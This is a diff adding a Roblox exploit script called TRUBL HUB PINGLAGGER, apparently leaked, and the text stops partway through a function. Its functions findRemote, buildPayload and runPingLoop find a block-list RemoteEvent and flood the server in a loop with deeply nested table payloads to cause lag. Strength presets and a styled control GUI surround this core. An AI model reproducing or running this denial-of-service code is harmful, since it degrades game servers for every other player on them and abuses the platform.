@@ -1,0 +1,1074 @@
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+print("LEAKED BY FRHUB")
+
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+assert(player, "Run TRUBL HUB as a client LocalScript")
+local playerGui = player:WaitForChild("PlayerGui")
+local active, lastBrainrotState = false, false
+local brainrotMode, manualOverride, pingGeneration = false, false, 0
+local remote = nil
+
+local MAIN_W, MAIN_H = 190, 90
+local SET_W, SET_H = 220, 280
+local BACKGROUNDS = {
+    {name = "Trubl 1", image = "rbxassetid://109129027497690"},
+    {name = "Trubl 2", image = "rbxassetid://86215967740731"},
+    {name = "Trubl 3", image = "rbxassetid://135259174177023"},
+    {name = "Trubl 4", image = "rbxassetid://117278680774265"},
+}
+local STRENGTH_PRESETS = {
+    {name = "Ultra Weak", power = 20000},
+    {name = "Extra Weak", power = 40000},
+    {name = "Weak", power = 60000},
+    {name = "Normal", power = 80000},
+    {name = "Strong", power = 100000},
+    {name = "Extra Strong", power = 120000},
+    {name = "Ultra Strong", power = 140000},
+}
+local function strengthName(power)
+    for _, preset in ipairs(STRENGTH_PRESETS) do
+        if preset.power == power then return preset.name end
+    end
+    return "Custom"
+end
+local FILE = "TRUBL_HUB.json"
+local defaults = {
+    power = 100000, interval = 0.125, autoBrainrot = true,
+    keyboard = "F", controller = "ButtonR2", background = 1, opacity = 80,
+    fpsBoost = false, ultraAntiLag = false,
+    guiSize = 100,
+    guiTransparency = 0,
+    mode = "MED",
+    modePowers = {LOW = 60000, MED = 100000, HIGH = 140000},
+}
+local function copyDefault(value)
+    if type(value) ~= "table" then return value end
+    local copy = {}
+    for k, v in pairs(value) do copy[k] = v end
+    return copy
+end
+local config = {}
+for k, v in pairs(defaults) do config[k] = copyDefault(v) end
+local function keycode(name)
+    local ok, value = pcall(function() return Enum.KeyCode[name] end)
+    return ok and value or nil
+end
+local function isGamepad(key)
+    local name = key.Name
+    return name:sub(1, 6) == "Button" or name:sub(1, 10) == "Thumbstick" or name:sub(1, 4) == "DPad"
+end
+local function finite(n)
+    return type(n) == "number" and n == n and n > -math.huge and n < math.huge
+end
+local function setModePower(value)
+    if not finite(value) then return false end
+    value = math.clamp(math.floor(value), 1, 1000000000)
+    config.modePowers[config.mode] = value
+    config.power = value
+    return true
+end
+local function selectPowerMode(mode)
+    if config.modePowers[mode] == nil then return false end
+    config.mode = mode
+    config.power = config.modePowers[mode]
+    return true
+end
+local function normalizeGUISize(value)
+    if type(value) == "string" then value = value:gsub("%%", "") end
+    local n = tonumber(value)
+    if not finite(n) then return nil end
+    return math.clamp(math.floor(n + 0.5), 50, 150)
+end
+local function load()
+    if type(readfile) ~= "function" then return end
+    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(FILE)) end)
+    if not ok or type(data) ~= "table" then return end
+    if finite(data.power) then config.power = math.clamp(math.floor(data.power), 1, 1000000000) end
+    if type(data.mode) == "string" and defaults.modePowers[data.mode] then config.mode = data.mode end
+    if type(data.modePowers) == "table" then
+        for mode in pairs(defaults.modePowers) do
+            local value = data.modePowers[mode]
+            if finite(value) then config.modePowers[mode] = math.clamp(math.floor(value), 1, 1000000000) end
+        end
+    elseif finite(data.power) then
+        config.modePowers[config.mode] = config.power
+    end
+    config.power = config.modePowers[config.mode]
+    if finite(data.interval) then config.interval = math.clamp(data.interval, 0.01, 60) end
+    if finite(data.background) then config.background = math.clamp(math.floor(data.background), 1, 4) end
+    if finite(data.opacity) then config.opacity = math.clamp(math.floor(data.opacity), 0, 100) end
+    if finite(data.guiTransparency) then
+        config.guiTransparency = math.clamp(math.floor(data.guiTransparency), 0, 90)
+    end
+    config.guiSize = normalizeGUISize(data.guiSize) or defaults.guiSize
+    if type(data.autoBrainrot) == "boolean" then config.autoBrainrot = data.autoBrainrot end
+    if type(data.fpsBoost) == "boolean" then config.fpsBoost = data.fpsBoost end
+    if type(data.ultraAntiLag) == "boolean" then config.ultraAntiLag = data.ultraAntiLag end
+    if data.keyboard == "None" then config.keyboard = "None" end
+    if data.controller == "None" then config.controller = "None" end
+    local kb, gp = keycode(data.keyboard), keycode(data.controller)
+    if kb and not isGamepad(kb) and kb ~= Enum.KeyCode.Unknown
+        and kb ~= Enum.KeyCode.Escape and kb ~= Enum.KeyCode.LeftControl then config.keyboard = kb.Name end
+    if gp and isGamepad(gp) then config.controller = gp.Name end
+end
+load()
+local function save()
+    if type(writefile) == "function" then
+        pcall(function() writefile(FILE, HttpService:JSONEncode(config)) end)
+    end
+end
+
+local function findRemote()
+    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+    if not rrs then return nil end
+    for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
+        local r = rrs:FindFirstChild(name)
+        if r and r:IsA("RemoteEvent") then return r end
+    end
+    for _, c in ipairs(rrs:GetChildren()) do
+        if c:IsA("RemoteEvent") and c.Name:find("Block") then return c end
+    end
+    return nil
+end
+local function buildPayload(power)
+    local payload = {}
+    local nested = {{}}
+    local current = nested[1]
+    for _ = 1, 186 do
+        local node = {}
+        table.insert(current, node)
+        current = node
+    end
+    local repetitions = math.min(math.floor(power / 188), 10000)
+    for _ = 1, repetitions do table.insert(payload, nested) end
+    return payload
+end
+local function runPingLoop()
+    pingGeneration = pingGeneration + 1
+    local generation = pingGeneration
+    local configured = config.interval
+    local delay = configured
+    while active and generation == pingGeneration and remote do
+        if config.interval ~= configured then
+            configured = config.interval
+            delay = configured
+        end
+        local ok = pcall(function() remote:FireServer(buildPayload(config.power)) end)
+        if not ok then
+            delay = math.min(delay * 1.5, 0.5)
+        else
+            delay = math.max(delay * 0.995, 0.05)
+        end
+        task.wait(delay)
+    end
+end
+
+for _, name in ipairs({"TRUBLPINGLAGGER", "TRUBLHUB"}) do
+    local old = playerGui:FindFirstChild(name)
+    if old then old:Destroy() end
+end
+local screen = Instance.new("ScreenGui")
+screen.Name = "TRUBLHUB"
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 15
+screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screen.Parent = playerGui
+local connections = {}
+local function connect(signal, fn)
+    local c = signal:Connect(fn)
+    table.insert(connections, c)
+    return c
+end
+screen.Destroying:Connect(function()
+    active = false
+    pingGeneration = pingGeneration + 1
+    for _, c in ipairs(connections) do c:Disconnect() end
+end)
+
+local function createGraphicsOptimizer()
+    local Lighting = game:GetService("Lighting")
+    local World = game:GetService("Workspace")
+    local module = {fps = false, ultra = false, closed = false, generation = 0}
+    local snapshots, sceneConnection, lightConnection = {}, nil, nil
+    local savedCap, capChanged
+    local function remember(object, property, value)
+        local properties = snapshots[object]
+        if not properties then properties = {}; snapshots[object] = properties end
+        if properties[property] == nil then
+            local ok, original = pcall(function() return object[property] end)
+            if not ok then return end
+            properties[property] = {value = original}
+        end
+        pcall(function() object[property] = value end)
+    end
+    local function restore()
+        for object, properties in pairs(snapshots) do
+            if properties.Parent then pcall(function() object.Parent = properties.Parent.value end) end
+        end
+        for object, properties in pairs(snapshots) do
+            for property, data in pairs(properties) do
+                if property ~= "Parent" then pcall(function() object[property] = data.value end) end
+            end
+        end
+        snapshots = {}
+    end
+    local function skipFPS(object)
+        local current = object
+        while current do
+            local name = current.Name:lower()
+            if name == "laser" or name == "laserhitbox"
+                or name == "flowerskin_katanarealistic" or name == "flowerskin_assetkatana"
+                or name == "customunionvisual" then return true end
+            if current:IsA("Tool") or current:IsA("Accessory") or current:IsA("Accoutrement") then return true end
+            if current:IsA("Model") and (current:FindFirstChildOfClass("Humanoid")
+                or Players:GetPlayerFromCharacter(current)) then return true end
+            if current:GetAttribute("CursedBatSkinsGenerated") == true
+                or current:GetAttribute("CursedBatSkinsExactMesh") == true then return true end
+            current = current.Parent
+        end
+        return false
+    end
+    local function particle(object)
+        return object:IsA("ParticleEmitter") or object:IsA("Beam") or object:IsA("Trail")
+            or object:IsA("Fire") or object:IsA("Smoke") or object:IsA("Sparkles")
+    end
+    local function postEffect(object)
+        return object:IsA("BlurEffect") or object:IsA("SunRaysEffect")
+            or object:IsA("ColorCorrectionEffect") or object:IsA("BloomEffect")
+            or object:IsA("DepthOfFieldEffect")
+    end
+    local function stopAnimations(object)
+        pcall(function()
+            for _, track in ipairs(object:GetPlayingAnimationTracks()) do track:Stop(0) end
+        end)
+    end
+    local function applyObject(object)
+        if module.closed then return end
+        local useFPS = module.fps and not skipFPS(object)
+        if module.ultra and not object:IsA("Accessory") and not object:IsA("Hat") then
+            if object:IsA("BasePart") then
+                remember(object, "Material", Enum.Material.Plastic)
+                remember(object, "Reflectance", 0)
+                remember(object, "CastShadow", false)
+            elseif object:IsA("Decal") or object:IsA("Texture") then
+                remember(object, "Transparency", 1)
+            elseif particle(object) then
+                remember(object, "Enabled", false)
+            elseif object:IsA("Animator") or object:IsA("AnimationController") then
+                stopAnimations(object)
+            end
+        end
+        if not useFPS then return end
+        if particle(object) then
+            remember(object, "Enabled", false)
+            remember(object, "Parent", nil)
+        elseif object:IsA("Animator") then
+            stopAnimations(object)
+        elseif object:IsA("Texture") or object:IsA("Decal") or object:IsA("ImageLabel")
+            or object:IsA("ImageButton") or object:IsA("SurfaceAppearance") or object:IsA("BlockMesh")
+            or object:IsA("SelectionBox") or object:IsA("SelectionSphere") then
+            remember(object, "Parent", nil)
+        elseif object:IsA("SpecialMesh") then
+            remember(object, "TextureId", "")
+            remember(object, "Parent", nil)
+        elseif object:IsA("BillboardGui") then
+            local name = object.Name:lower()
+            if name ~= "overhead" and name ~= "trublogh" and name ~= "yourbase" and not name:find("esp") then
+                remember(object, "Parent", nil)
+            end
+        elseif object:IsA("SurfaceGui") then
+            if not object.Parent or object.Parent.Name ~= "PlotSign" then remember(object, "Parent", nil) end
+        elseif object:IsA("BasePart") then
+            remember(object, "Material", Enum.Material.Plastic)
+            remember(object, "CastShadow", false)
+            remember(object, "Reflectance", 0)
+            remember(object, "RenderFidelity", Enum.RenderFidelity.Automatic)
+        elseif object:IsA("PointLight") or object:IsA("SpotLight") or object:IsA("SurfaceLight") then
+            remember(object, "Enabled", false)
+        end
+    end
+    local function applyLightObject(object)
+        if module.fps and (postEffect(object) or object:IsA("Atmosphere") or object:IsA("Sky")) then
+            remember(object, "Parent", nil)
+        elseif module.ultra and postEffect(object) then
+            remember(object, "Enabled", false)
+        end
+    end
+    local function disconnectWatchers()
+        if sceneConnection then sceneConnection:Disconnect(); sceneConnection = nil end
+        if lightConnection then lightConnection:Disconnect(); lightConnection = nil end
+    end
+    function module.set(fps, ultra)
+        if module.closed then return end
+        fps, ultra = fps == true, ultra == true
+        if module.fps == fps and module.ultra == ultra then return end
+        module.generation = module.generation + 1
+        local generation = module.generation
+        disconnectWatchers()
+        restore()
+        if capChanged and not fps then
+            pcall(function() setfpscap(savedCap) end)
+            savedCap, capChanged = nil, false
+        end
+        if fps and not capChanged and type(setfpscap) == "function" then
+            savedCap = 60
+            if type(getfpscap) == "function" then
+                local ok, cap = pcall(getfpscap)
+                if ok and finite(cap) and cap > 0 then savedCap = cap end
+            end
+            local ok = pcall(setfpscap, 9999999)
+            capChanged = ok
+        end
+        module.fps, module.ultra = fps, ultra
+        if not fps and not ultra then return end
+        if fps then
+            remember(Lighting, "GlobalShadows", false)
+            remember(Lighting, "Brightness", 2)
+            remember(Lighting, "Ambient", Color3.fromRGB(178, 178, 178))
+            remember(Lighting, "OutdoorAmbient", Color3.fromRGB(178, 178, 178))
+            remember(Lighting, "FogEnd", 100000)
+            remember(Lighting, "FogStart", 100000)
+        end
+        if ultra then
+            remember(Lighting, "GlobalShadows", false)
+            remember(Lighting, "FogEnd", 1e10)
+            remember(Lighting, "Brightness", 0)
+        end
+        for _, object in ipairs(Lighting:GetChildren()) do pcall(applyLightObject, object) end
+        sceneConnection = World.DescendantAdded:Connect(function(object)
+            task.defer(function()
+                if not module.closed and generation == module.generation then pcall(applyObject, object) end
+            end)
+        end)
+        lightConnection = Lighting.ChildAdded:Connect(function(object)
+            task.defer(function()
+                if not module.closed and generation == module.generation then pcall(applyLightObject, object) end
+            end)
+        end)
+        task.spawn(function()
+            for i, object in ipairs(World:GetDescendants()) do
+                if module.closed or generation ~= module.generation then return end
+                pcall(applyObject, object)
+                if i % 350 == 0 then task.wait() end
+            end
+        end)
+    end
+    function module.close()
+        if module.closed then return end
+        module.set(false, false)
+        module.generation = module.generation + 1
+        module.closed = true
+        disconnectWatchers()
+        restore()
+    end
+    return module
+end
+local graphics = createGraphicsOptimizer()
+screen.Destroying:Connect(function() graphics.close() end)
+
+local C = {
+    black = Color3.fromRGB(5, 5, 8), card = Color3.fromRGB(17, 15, 20),
+    red = Color3.fromRGB(255, 25, 43), darkRed = Color3.fromRGB(83, 10, 22),
+    white = Color3.fromRGB(248, 244, 246), dim = Color3.fromRGB(166, 155, 164),
+    line = Color3.fromRGB(77, 27, 38),
+}
+local function make(class, parent, props)
+    local o = Instance.new(class)
+    for k, v in pairs(props or {}) do o[k] = v end
+    o.Parent = parent
+    return o
+end
+local function corner(o, radius)
+    local c = o:FindFirstChildOfClass("UICorner") or make("UICorner", o)
+    c.CornerRadius = UDim.new(0, radius or 8)
+end
+local function stroke(o, color, width)
+    return make("UIStroke", o, {ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+        Color = color or C.line, Thickness = width or 1})
+end
+local movingGradients = {}
+local shimmerTimes = {0, 0.125, 0.1875, 0.25, 0.375, 0.4375, 0.5, 0.625, 0.6875, 0.75, 0.875, 0.9375, 1}
+local red, darkRed, black = Color3.fromRGB(255, 0, 0), Color3.fromRGB(80, 0, 0), Color3.fromRGB(0, 0, 0)
+local shimmerColors = {red, red, darkRed, black, black, darkRed, red, red, darkRed, black, black, darkRed, red}
+local shimmerPoints = {}
+for i, time in ipairs(shimmerTimes) do shimmerPoints[i] = ColorSequenceKeypoint.new(time, shimmerColors[i]) end
+local shimmerSequence = ColorSequence.new(shimmerPoints)
+local function shimmer(object)
+    local gradient = make("UIGradient", object, {Color = shimmerSequence, Rotation = 0})
+    table.insert(movingGradients, gradient)
+    return gradient
+end
+local function tween(o, props)
+    TweenService:Create(o, TweenInfo.new(0.14, Enum.EasingStyle.Quad), props):Play()
+end
+local function label(parent, content, x, y, w, h, size, color, bold)
+    return make("TextLabel", parent, {
+        Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(w, h),
+        BackgroundTransparency = 1, Text = content, TextSize = size or 10,
+        TextColor3 = color or C.white, Font = bold and Enum.Font.GothamBold or Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left, TextWrapped = true,
+    })
+end
+local function button(parent, content, x, y, w, h)
+    local b = make("TextButton", parent, {
+        Position = UDim2.fromOffset(x, y), Size = UDim2.fromOffset(w, h),
+        BackgroundColor3 = C.card, BackgroundTransparency = 0.12, BorderSizePixel = 0,
+        Text = content, TextColor3 = C.white, TextSize = 9, Font = Enum.Font.GothamBold,
+        AutoButtonColor = false, Selectable = true,
+    })
+    corner(b, 6)
+    local outline = stroke(b)
+    connect(b.MouseEnter, function() tween(outline, {Color = C.red}) end)
+    connect(b.MouseLeave, function() tween(outline, {Color = C.line}) end)
+    return b
+end
+local images, shades = {}, {}
+local function applyVisibility()
+    local visibility = config.opacity / 100
+    for _, image in ipairs(images) do
+        image.Image = BACKGROUNDS[config.background].image
+        image.ImageTransparency = 1 - visibility
+    end
+    for _, shade in ipairs(shades) do shade.BackgroundTransparency = 0.25 + 0.75 * visibility end
+end
+local function window(name, w, h, position)
+    local frame = make("CanvasGroup", screen, {
+        Name = name, Size = UDim2.fromOffset(w, h), Position = position,
+        BackgroundColor3 = C.black, BorderSizePixel = 0, Active = true, ClipsDescendants = true,
+        GroupTransparency = config.guiTransparency / 100,
+    })
+    corner(frame, 10)
+    local outline = stroke(frame, C.white, 0.75)
+    outline.Name = "TrublRedMovingOutline"
+    shimmer(outline)
+    local image = make("ImageLabel", frame, {
+        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+        Image = BACKGROUNDS[config.background].image, ScaleType = Enum.ScaleType.Crop,
+        ImageTransparency = 1 - config.opacity / 100,
+    })
+    corner(image, 10)
+    table.insert(images, image)
+    local shade = make("Frame", frame, {Name = "RoundedShade", Size = UDim2.fromScale(1, 1),
+        BackgroundColor3 = C.black, BackgroundTransparency = 1, BorderSizePixel = 0})
+    corner(shade, 10)
+    table.insert(shades, shade)
+    return frame
+end
+local main = window("Main", MAIN_W, MAIN_H, UDim2.new(0.5, -MAIN_W / 2, 0.5, -MAIN_H / 2))
+local settings = window("Settings", SET_W, SET_H, UDim2.new(0.5, 110, 0.5, -140))
+settings.Visible = false
+local function applyGUITransparency()
+    local transparency = config.guiTransparency / 100
+    main.GroupTransparency = transparency
+    settings.GroupTransparency = transparency
+end
+local mainScale = make("UIScale", main, {Name = "TrublGUIScale", Scale = config.guiSize / 100})
+local settingsScale = make("UIScale", settings, {Name = "TrublGUIScale", Scale = config.guiSize / 100})
+local function clampFrame(frame)
+    local view = screen.AbsoluteSize
+    if view.X < 1 or view.Y < 1 then return end
+    local scale = frame == main and mainScale.Scale or settingsScale.Scale
+    local width, height = frame.Size.X.Offset * scale, frame.Size.Y.Offset * scale
+    local p = frame.Position
+    local x = p.X.Scale * view.X + p.X.Offset
+    local y = p.Y.Scale * view.Y + p.Y.Offset
+    frame.Position = UDim2.fromOffset(math.clamp(x, 0, math.max(0, view.X - width)),
+        math.clamp(y, 0, math.max(0, view.Y - height)))
+end
+local function applyGUISize()
+    local scale = config.guiSize / 100
+    mainScale.Scale = scale
+    settingsScale.Scale = scale
+    clampFrame(main)
+    clampFrame(settings)
+end
+local mainHeader = make("Frame", main, {Size = UDim2.fromOffset(118, 28), BackgroundTransparency = 1, Active = true})
+local mainBrand = label(mainHeader, "TRUBL", 10, 2, 88, 13, 11, C.white, true)
+local mainSubtitle = label(mainHeader, "PINGLAGGER", 10, 15, 90, 10, 8, C.red, true)
+mainBrand.Font = Enum.Font.GothamBlack
+mainSubtitle.Font = Enum.Font.GothamBlack
+local pill = label(main, "OFF", 118, 7, 27, 17, 8, C.dim, true)
+local cfgButton = button(main, "CFG", 151, 6, 31, 18)
+local activate = button(main, "", 8, 32, 124, 42)
+activate.BackgroundColor3 = C.black
+activate.BackgroundTransparency = 0.2
+local activeOutline = stroke(activate, C.red, 1.5)
+local stateRail = make("Frame", activate, {Position = UDim2.fromOffset(0, 6),
+    Size = UDim2.fromOffset(3, 30), BackgroundColor3 = C.red, BorderSizePixel = 0})
+corner(stateRail, 2)
+local activateTitle = label(activate, "ACTIVATE", 13, 4, 104, 19, 13, C.white, true)
+label(activate, "PING LAG", 13, 24, 104, 12, 7, C.dim, true)
+local modeButtons = {}
+for i, mode in ipairs({"LOW", "MED", "HIGH"}) do
+    local b = button(main, mode, 139, 32 + (i - 1) * 15, 43, 12)
+    b.TextSize = 7
+    corner(b, 4)
+    modeButtons[mode] = b
+end
+local detectorLabel = label(main, "AUTO / WAITING", 9, 77, 173, 10, 7, C.dim, true)
+
+local settingsHeader = make("Frame", settings, {Size = UDim2.fromOffset(185, 30),
+    BackgroundTransparency = 1, Active = true})
+local settingsBrand = label(settingsHeader, "TRUBL PINGLAGGER", 10, 3, 172, 15, 10, C.white, true)
+settingsBrand.Font = Enum.Font.GothamBlack
+label(settingsHeader, "C O N F I G U R A T I O N", 10, 19, 170, 10, 6, C.red, true)
+local close = button(settings, "x", 192, 6, 20, 20)
+local controlsTab = button(settings, "TUNE", 8, 36, 64, 22)
+local bindsTab = button(settings, "BINDS", 78, 36, 64, 22)
+local styleTab = button(settings, "STYLE", 148, 36, 64, 22)
+local controls = make("Frame", settings, {Position = UDim2.fromOffset(8, 63),
+    Size = UDim2.fromOffset(204, 209), BackgroundTransparency = 1})
+local binds = make("Frame", settings, {Position = UDim2.fromOffset(8, 63),
+    Size = UDim2.fromOffset(204, 209), BackgroundTransparency = 1, Visible = false})
+local appearance = make("Frame", settings, {Position = UDim2.fromOffset(8, 63),
+    Size = UDim2.fromOffset(204, 209), BackgroundTransparency = 1, Visible = false})
+local function card(parent, x, y, w, h)
+    local frame = make("Frame", parent, {Position = UDim2.fromOffset(x, y),
+        Size = UDim2.fromOffset(w, h), BackgroundColor3 = C.black,
+        BackgroundTransparency = 0.18, BorderSizePixel = 0})
+    corner(frame, 8)
+    stroke(frame)
+    return frame
+end
+label(controls, "01 / CONTROLS", 2, 0, 202, 18, 8, C.red, true)
+local refresh
+local function inputTile(title, field, x)
+    local tile = card(controls, x, 20, 98, 44)
+    label(tile, title, 8, 3, 82, 14, 8, C.dim, true)
+    local box = make("TextBox", tile, {
+        Position = UDim2.fromOffset(7, 21), Size = UDim2.fromOffset(84, 18),
+        BackgroundColor3 = C.card, BackgroundTransparency = 0.15, BorderSizePixel = 0,
+        Text = tostring(config[field]), TextColor3 = C.white, TextSize = 10,
+        Font = Enum.Font.GothamBold, ClearTextOnFocus = false,
+    })
+    corner(box, 5)
+    stroke(box)
+    connect(box.FocusLost, function()
+        local n = tonumber(box.Text)
+        if finite(n) then
+            if field == "power" then setModePower(n)
+            else config.interval = math.clamp(n, 0.01, 60) end
+            save()
+        end
+        box.Text = tostring(config[field])
+        if refresh then refresh() end
+    end)
+    return box
+end
+local powerBox = inputTile("POWER", "power", 0)
+local delayBox = inputTile("DELAY / SECS", "interval", 106)
+local strengthButton = button(controls, "", 0, 70, 204, 24)
+local strengthCaption = label(strengthButton, "Strength / MED", 9, 2, 80, 20, 8, C.white, true)
+local strengthValue = label(strengthButton, "", 87, 2, 108, 20, 9, C.red, true)
+strengthValue.TextXAlignment = Enum.TextXAlignment.Right
+local autoCard = card(controls, 0, 100, 204, 24)
+label(autoCard, "Auto Brainrot", 9, 2, 140, 20, 9, C.white, true)
+local autoToggle = button(autoCard, "", 157, 2, 38, 20)
+corner(autoToggle, 10)
+local knob = make("Frame", autoToggle, {Size = UDim2.fromOffset(14, 14),
+    Position = UDim2.fromOffset(3, 3), BackgroundColor3 = C.white, BorderSizePixel = 0})
+corner(knob, 7)
+local function graphicsToggle(title, y)
+    local row = card(controls, 0, y, 204, 24)
+    label(row, title, 9, 2, 140, 20, 9, C.white, true)
+    local toggle = button(row, "", 157, 2, 38, 20)
+    corner(toggle, 10)
+    local dot = make("Frame", toggle, {Size = UDim2.fromOffset(14, 14),
+        Position = UDim2.fromOffset(3, 3), BackgroundColor3 = C.white, BorderSizePixel = 0})
+    corner(dot, 7)
+    return toggle, dot
+end
+local fpsToggle, fpsKnob = graphicsToggle("FPS Boost", 130)
+local ultraToggle, ultraKnob = graphicsToggle("Ultra Anti Lag", 160)
+local reset = button(controls, "Reset defaults", 0, 190, 204, 18)
+label(binds, "02 / INPUT BINDINGS", 2, 0, 202, 18, 8, C.red, true)
+local kbCard = card(binds, 0, 24, 204, 47)
+local gpCard = card(binds, 0, 78, 204, 47)
+label(kbCard, "KEYBOARD", 9, 3, 185, 12, 8, C.dim, true)
+label(gpCard, "CONTROLLER", 9, 3, 185, 12, 8, C.dim, true)
+local kbButton = button(kbCard, config.keyboard, 9, 19, 150, 22)
+local gpButton = button(gpCard, config.controller, 9, 19, 150, 22)
+local kbClear = button(kbCard, "x", 168, 19, 27, 22)
+local gpClear = button(gpCard, "x", 168, 19, 27, 22)
+local sizeCard = card(binds, 0, 132, 204, 51)
+label(sizeCard, "GUI SIZE  /  BOTH WINDOWS", 8, 4, 188, 12, 8, C.dim, true)
+local sizeLess = button(sizeCard, "-", 8, 23, 24, 22)
+local sizeMore = button(sizeCard, "+", 172, 23, 24, 22)
+local guiSizeBox = make("TextBox", sizeCard, {
+    Name = "GUISizePercent", Position = UDim2.fromOffset(40, 23), Size = UDim2.fromOffset(124, 22),
+    BackgroundColor3 = C.card, BackgroundTransparency = 0.15, BorderSizePixel = 0,
+    Text = tostring(config.guiSize) .. "%", PlaceholderText = "50-150%",
+    TextColor3 = C.white, TextSize = 10, Font = Enum.Font.GothamBold, ClearTextOnFocus = false,
+})
+corner(guiSizeBox, 5)
+stroke(guiSizeBox)
+label(binds, "Click to rebind / Esc: cancel\nLeft Ctrl: hide / show", 2, 188, 200, 20, 7, C.dim)
+
+label(appearance, "03 / TRUBL BACKGROUNDS", 1, 0, 202, 18, 8, C.red, true)
+local previews = {}
+for i, asset in ipairs(BACKGROUNDS) do
+    local x, y = ((i - 1) % 2) * 105, 22 + math.floor((i - 1) / 2) * 38
+    local b = button(appearance, "", x, y, 99, 32)
+    b.ClipsDescendants = true
+    local img = make("ImageLabel", b, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+        Image = asset.image, ImageTransparency = 0.15, ScaleType = Enum.ScaleType.Crop})
+    corner(img, 6)
+    local caption = label(b, asset.name, 4, 15, 91, 14, 8, C.white, true)
+    caption.BackgroundTransparency = 0.2
+    caption.BackgroundColor3 = C.black
+    corner(caption, 4)
+    caption.TextXAlignment = Enum.TextXAlignment.Center
+    previews[i] = {outline = stroke(b, C.red, 2)}
+    connect(b.Activated, function()
+        config.background = i
+        for _, image in ipairs(images) do image.Image = asset.image end
+        for j, entry in ipairs(previews) do entry.outline.Transparency = j == i and 0 or 1 end
+        save()
+    end)
+end
+local visibilityCard = card(appearance, 0, 100, 204, 44)
+local opacityLabel = label(visibilityCard, "", 8, 3, 188, 14, 8, C.white, true)
+local less = button(visibilityCard, "-", 8, 21, 23, 18)
+local more = button(visibilityCard, "+", 173, 21, 23, 18)
+local slider = make("TextButton", visibilityCard, {Name = "VisibilitySlider",
+    Position = UDim2.fromOffset(40, 25), Size = UDim2.fromOffset(124, 10),
+    BackgroundColor3 = C.line, BorderSizePixel = 0, Text = "", AutoButtonColor = false})
+corner(slider, 6)
+local sliderFill = make("Frame", slider, {Size = UDim2.fromScale(0.8, 1),
+    BackgroundColor3 = C.red, BorderSizePixel = 0})
+corner(sliderFill, 6)
+local transparencyCard = card(appearance, 0, 150, 204, 44)
+local transparencyLabel = label(transparencyCard, "", 8, 3, 188, 14, 8, C.white, true)
+local transparencyLess = button(transparencyCard, "-", 8, 21, 23, 18)
+local transparencyMore = button(transparencyCard, "+", 173, 21, 23, 18)
+local transparencySlider = make("TextButton", transparencyCard, {Name = "GUITransparencySlider",
+    Position = UDim2.fromOffset(40, 25), Size = UDim2.fromOffset(124, 10),
+    BackgroundColor3 = C.line, BorderSizePixel = 0, Text = "", AutoButtonColor = false})
+corner(transparencySlider, 6)
+local transparencyFill = make("Frame", transparencySlider, {Size = UDim2.fromScale(0, 1),
+    BackgroundColor3 = C.red, BorderSizePixel = 0})
+corner(transparencyFill, 6)
+label(appearance, "Both windows / transparency 0-90%", 2, 199, 200, 10, 7, C.dim)
+
+local strengthPicker = make("Frame", settings, {
+    Name = "SelectStrength", Size = UDim2.fromOffset(SET_W, SET_H), Position = UDim2.fromOffset(0, 0),
+    BackgroundColor3 = C.black, BackgroundTransparency = 0, BorderSizePixel = 0,
+    Visible = false, Active = true, ZIndex = 30, ClipsDescendants = true,
+})
+corner(strengthPicker, 10)
+local pickerImage = make("ImageLabel", strengthPicker, {
+    Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+    Image = BACKGROUNDS[config.background].image, ImageTransparency = 1 - config.opacity / 100,
+    ScaleType = Enum.ScaleType.Crop,
+})
+corner(pickerImage, 10)
+table.insert(images, pickerImage)
+local pickerShade = make("Frame", strengthPicker, {
+    Size = UDim2.fromScale(1, 1), BackgroundColor3 = C.black, BackgroundTransparency = 1, BorderSizePixel = 0,
+})
+corner(pickerShade, 10)
+table.insert(shades, pickerShade)
+shimmer(stroke(strengthPicker, C.white, 0.75))
+local pickerTitle = label(strengthPicker, "Select Strength / MED", 10, 7, 172, 25, 11, C.white, true)
+pickerTitle.Font = Enum.Font.GothamBlack
+local pickerClose = button(strengthPicker, "x", 190, 9, 21, 21)
+local strengthChoices = {}
+for i, preset in ipairs(STRENGTH_PRESETS) do
+    local choice = button(strengthPicker, "", 9, 39 + (i - 1) * 32, 202, 27)
+    label(choice, preset.name, 9, 0, 130, 27, 10, C.white, true)
+    local value = label(choice, tostring(preset.power), 139, 0, 54, 27, 8, C.red, true)
+    value.TextXAlignment = Enum.TextXAlignment.Right
+    strengthChoices[i] = choice
+end
+local pickerModeNote = label(strengthPicker, "MED MODE / POWER VALUE", 9, 264, 202, 11, 6, C.dim)
+
+local reopen = button(screen, "TRUBL", 14, 100, 44, 32)
+reopen.TextColor3 = C.red
+reopen.Visible = false
+local listening, resetArmed
+local function renderActivation()
+    activateTitle.Text = active and "ACTIVATED" or "ACTIVATE"
+    pill.Text = active and "ON" or "OFF"
+    pill.TextColor3 = active and C.red or C.dim
+    tween(activate, {BackgroundColor3 = active and C.darkRed or C.black})
+    tween(activeOutline, {Transparency = active and 0 or 0.25})
+    tween(stateRail, {BackgroundColor3 = active and C.white or C.red})
+end
+
+local function flipLag(state, isManual)
+    if isManual then manualOverride = brainrotMode and not state end
+    if state and not remote then remote = findRemote() end
+    if state and not remote then state = false end
+    local changed = state ~= active
+    if changed then
+        active = state
+        if not active then pingGeneration = pingGeneration + 1 end
+    end
+    renderActivation()
+    if changed and active then task.spawn(runPingLoop) end
+end
+refresh = function()
+    applyGUITransparency()
+    guiSizeBox.Text = tostring(config.guiSize) .. "%"
+    applyGUISize()
+    powerBox.Text = tostring(config.power)
+    strengthCaption.Text = "Strength / " .. config.mode
+    pickerTitle.Text = "Select Strength / " .. config.mode
+    pickerModeNote.Text = config.mode .. " MODE / POWER VALUE"
+    for mode, b in pairs(modeButtons) do
